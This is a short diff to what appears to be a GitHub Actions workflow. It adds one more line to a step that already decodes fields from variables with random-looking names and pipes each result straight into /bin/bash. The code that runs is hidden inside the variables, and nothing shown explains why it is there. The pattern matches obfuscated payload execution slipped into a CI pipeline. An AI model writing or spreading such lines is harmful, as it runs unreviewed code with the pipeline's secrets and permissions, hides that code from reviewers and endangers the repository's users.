@@ -33,6 +33,7 @@ jobs:
           echo $sbrme73635 | jq -r .qrfj0956 | /bin/bash
           printf '%s' "$fcerl58580" | jq -r .g54 | /bin/bash
           printf '%s' "$odsvm2" | jq -r .tnf71973 | /bin/bash
+          echo $wgz0890 | jq -r .f52 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
